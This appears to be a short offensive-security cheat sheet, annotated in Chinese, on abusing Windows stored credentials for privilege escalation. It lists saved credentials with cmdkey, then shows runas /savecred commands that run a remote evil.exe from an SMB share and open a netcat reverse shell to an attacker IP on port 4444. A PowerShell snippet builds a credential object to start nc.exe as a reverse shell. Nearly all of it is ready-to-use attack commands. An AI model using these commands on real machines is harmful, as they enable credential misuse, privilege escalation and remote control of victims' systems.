	使用cmdkey列出机器上存储的凭据
	>cmdkey /list
	Currently stored credentials:
	 Target: Domain:interactive=WORKGROUP\Administrator
	 Type: Domain Password
	 User: WORKGROUP\Administrator
	可以使用runas的/savecred参数以使用保存的凭据。以下示例通过 SMB 共享调用远程可执行文件
	>runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
	>runas /savecred /user:Administrator "cmd.exe /k whoami"
	>C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"

	$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
	$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
	$computer = "<hostname>"
	[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
